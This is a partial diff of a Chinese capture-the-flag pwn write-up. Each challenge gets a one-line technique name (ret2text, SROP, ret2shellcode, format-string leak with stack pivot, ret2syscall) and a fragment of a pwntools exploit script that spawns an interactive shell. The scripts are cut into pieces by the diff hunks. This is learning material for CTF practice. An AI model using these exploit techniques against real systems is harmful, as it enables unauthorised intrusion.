@@ -1,13 +1,8 @@
 # 浅红欺醉粉，肯信有江梅
-
 nc签到题，没什么好说的
-
 nc一下即可
-
 # 领取你的小猫娘
-
 ret2text，让rbp - 0x8的位置不为零即可获取shell
-
 ```Python
 from pwn import *
 
@@ -26,13 +21,8 @@ p.sendline(b'a' * 0x50)
 
 p.interactive()
 ```
-
 # 当时只道是寻常
-
-Srop 原理 [SROP](https://hnusec-team.feishu.cn/wiki/EfjYw6fANiOQudkPfkHcKCmWnnf)
-
 非常简单的SROP应用，直接构造一个`frame`在栈上，然后给`rax`赋值并执行`syscall`即可
-
 ```Python
 from pwn import *
 
@@ -67,11 +57,8 @@ p.send(payload)
 
 p.interactive()
 ```
-
 # 我觉君非池中物，咫尺蛟龙云雨
-
 ret2shellcode ，构造一段比 0x20 短的shellcode即可
-
 ```Python
 from pwn import *
 
@@ -91,11 +78,8 @@ p.send(shellcode)
 
 p.interactive()
 ```
-
 # 铜雀春深锁二乔
-
 格式化字符串漏洞加栈迁移，不明白为什么就是不给libc 2.35
-
 ```Python
 from pwn import *
 from LibcSearcher import *
@@ -165,11 +149,8 @@ payload = b'a' * 0x8 + p64(canary) + p64(stack - 0x30) + p64(leave_ret)
 p.send(payload)
 p.interactive()
 ```
-
 # 江南无所有，聊赠一枝春
-
 ret2text
-
 ```Python
 from pwn import *
 
@@ -191,11 +172,8 @@ p.sendline(payload)
 
 p.interactive()
 ```
-
 # 被酒莫惊春睡重
-
 ret2syscall
-
 ```Python
 from pwn import *
 
@@ -231,11 +209,8 @@ payload = flat([
 p.sendline(payload)
 p.interactive()
 ```
-
 # 赌书消得泼茶香
-
 加密的ret2text
-
 ```Python
 from pwn import *
 import base64
@@ -265,9 +240,7 @@ p.sendline(base64.b64encode(payload))
 
 p.interactive()
 ```
-
 # 萧萧黄叶闭疏窗
-
 ```Python
 from pwn import *
 
@@ -290,9 +263,7 @@ p.sendline(b"A" * (0x40 + 0x8) + p64(0x4040a0 + 0x50) + shellcode)
 
 p.interactive()
 ```
-
 # 借的东风破金锁
-
 ```Python
 from pwn import *
 
